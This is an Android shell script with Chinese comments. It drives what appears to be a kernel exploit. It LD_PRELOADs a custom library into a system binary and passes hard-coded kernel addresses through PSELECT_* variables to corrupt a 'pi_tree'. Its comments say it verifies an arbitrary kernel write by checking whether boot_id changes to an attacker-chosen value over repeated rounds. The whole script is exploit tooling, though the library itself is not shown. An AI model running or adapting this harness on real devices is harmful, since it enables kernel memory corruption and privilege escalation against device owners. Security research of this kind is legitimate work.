#!/system/bin/sh
# mt28d: pi_tree 任意值写验证 — word3=0xffffff80028a77e0 → *word4(=boot_id)
# pi 写触发 → boot_id = e0778a02-80ff-ffff
# 仅主树写   → boot_id = c8778a02-80ff-ffff (tree_pc)
SRC=/sdcard/Documents/matisse_backup_essentials/preload_mt28d.so
DST=/data/local/tmp/preload.so
LOG=/sdcard/Documents/matisse_backup_essentials/logs/mt28d.txt
RUNLOG=/data/local/tmp/mt28d_run.out
rm -f $DST; cp $SRC $DST; sync
echo "boot_before=$(cat /proc/sys/kernel/random/boot_id)" > $LOG
am kill-all 2>&1 | tail -1
echo "=== 3 轮独立进程 ==="
for R in 1 2 3; do
  echo "--- round $R start $(date +%H:%M:%S)" >> $LOG
  rm -f $RUNLOG
  timeout 220 env \
    PSELECT_SLIDE_TRIGGER=1 \
    PSELECT_RETRY=1 \
    PSELECT_TREE_PC=ffffff80028a77c8 \
    PSELECT_TREE_RIGHT=ffffff80028a77e0 \
    PSELECT_TREE_LEFT=0 \
    PSELECT_PI_PC=ffffff80028a77e0 \
    PSELECT_PI_RIGHT=ffffff80028a77d0 \
    PSELECT_PI_LEFT=0 \
    PSELECT_SKIP_WARMUP=1 \
    LD_PRELOAD=$DST /system/bin/sleep 180 > $RUNLOG 2>&1
  echo "round=$R rc=$?" >> $LOG
  BID=$(cat /proc/sys/kernel/random/boot_id)
  echo "round=$R boot_id=$BID" >> $LOG
  case "$BID" in
    e0778a02-*) echo "★★★ PI-TREE WRITE FIRED round=$R ★★★" >> $LOG; break;;
  esac
  sleep 3
done
echo "=== boot_after=$(cat /proc/sys/kernel/random/boot_id)" >> $LOG
echo "=== DONE ===" >> $LOG
